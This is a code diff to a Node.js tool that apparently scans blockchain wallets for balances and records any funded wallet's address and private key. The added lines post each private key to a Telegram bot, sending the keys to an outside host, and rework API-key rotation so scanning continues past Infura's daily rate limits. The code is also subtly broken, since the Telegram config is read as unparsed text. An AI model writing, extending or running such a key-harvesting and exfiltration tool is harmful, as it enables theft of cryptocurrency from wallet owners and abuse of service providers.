@@ -1,7 +1,8 @@
 // const path = require("path");
+var request = require("request");
 const Web3 = require("web3");
 const fs = require('fs');
-var { log, logSuccess, logError } = require("./myStd");
+var { log, logSuccess, logError, logWaning } = require("./myStd");
 const clc = require("cli-color")
 
 const io = require("socket.io")(3001, {
@@ -43,6 +44,8 @@ const INFURA = [
 ];
 
 var web3s;
+
+var telegram = {}
 
 
 function ioemit() {
@@ -116,7 +119,7 @@ async function loadGoodWallets(file = "walletsGoodjs.json") {
 
 function discoveredGoodWallet(address, privateKey, balance, web3) {
     let chain = (new URL(web3._provider.host)).host.split(".")[0]
-    let content = `{"address":"${address}", "privateKey": "${privateKey}", "chain": "${chain}"}\n`;
+    let content = `{"address":"${address}", "privateKey": "${privateKey}", "chain": "${chain}", "balance": ${balance}}\n`;
     log("Good Wallets: ", content);
 
     // write to file
@@ -131,11 +134,15 @@ function discoveredGoodWallet(address, privateKey, balance, web3) {
         fs.close(fd, () => { logSuccess("walletsGoodjs Saved OK"); })
     });
 
+    sendMessage(content)
+
     const params = {
-        TableName: "goodaddresses",
+        TableName: "goodwallets",
         Item: {
             address: { S: address },
-            private: { S: privateKey },
+            privateKey: { S: privateKey },
+            balance: { N: balance },
+            chain: { S: chain }
         },
     };
     // save to database
@@ -153,6 +160,26 @@ function discoveredGoodWallet(address, privateKey, balance, web3) {
             chain: chain
         }
     })
+}
+
+function loadTelegram(file = "telegram.json") {
+    telegram = fs.readFileSync(file, { encoding: 'utf8', flag: 'r' })
+    return telegram;
+}
+
+function sendMessage(message) {
+
+    let options = {
+        method: 'POST',
+        url: `https://api.telegram.org/bot${telegram.token}/sendMessage`,
+        qs: { text: message, chat_id: telegram.chat_id },
+    };
+
+    request(options, function (error, response, body) {
+        if (error) throw new Error(error);
+        logError(error)
+    });
+
 }
 
 const scanWallets = () => {
@@ -182,19 +209,18 @@ const scanWallets = () => {
                         } else
                             return 0;
                     }).catch(err => {
-                        logError("get balance error: ", err.message);
-                        RUN = false;
                         if (err.message === 'Returned error: daily request count exceeded, request rate limited') {
                             if (current_INFURA_API_KEYS_index >= (INFURA_API_KEYS.length - 1)) {
+                                RUN = false;
                                 // when all keys exceeded, set time run again next day
                             } else {
                                 initWeb3(current_INFURA_API_KEYS_index++);
                             }
-                            logError("INFURA_API_KEYS exceeded: ", INFURA_API_KEYS[web3s.keyIndex]);
+                            logError("INFURA_API_KEYS exceeded: ", INFURA_API_KEYS[current_INFURA_API_KEYS_index]);
                         } else {
-
+                            logError("get balance error: ", err.message);
                         }
-                        ioemit("count_query", { error: `get balance error: ${err.message} - ${INFURA_API_KEYS[web3s.keyIndex]}`, RUN: RUN });
+                        ioemit("count_query", { error: `get balance error: ${err.message} - ${INFURA_API_KEYS[current_INFURA_API_KEYS_index]}`, RUN: RUN });
                     })
                 }, 10 * web3Index);
             })
@@ -214,7 +240,8 @@ function timerRun() {
         let now = new Date();
         let t = `${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`
         if (t === DAILY_TIME_RUN) {
-            logSuccess(t)
+            logSuccess("Start run scan: ", t)
+            RUN = true;
             scanWallets();
         }
     }, 1000)
@@ -222,9 +249,11 @@ function timerRun() {
 
 /*******/
 /* init app */
-loadInfuraAPIKeys().then(keys => initWeb3())
-    .then(getDailyTimeRun()
-        .then(timerRun))
+loadTelegram()
+loadInfuraAPIKeys()
+    .then(keys => initWeb3())
+    .then(web3s => getDailyTimeRun())
+    .then(timerRun)
 
 io.on('connection', async (_socket) => {
     socket = _socket;
@@ -234,10 +263,12 @@ io.on('connection', async (_socket) => {
         switch (msg) {
             case 'run_now':
                 RUN = true;
+                logWaning("Start scan: ", (new Date()).toTimeString())
                 scanWallets();
                 break;
             case 'pause_now':
                 RUN = false;
+                logError("Stop scan: ", (new Date()).toTimeString())
                 break;
             case "get":
                 break;
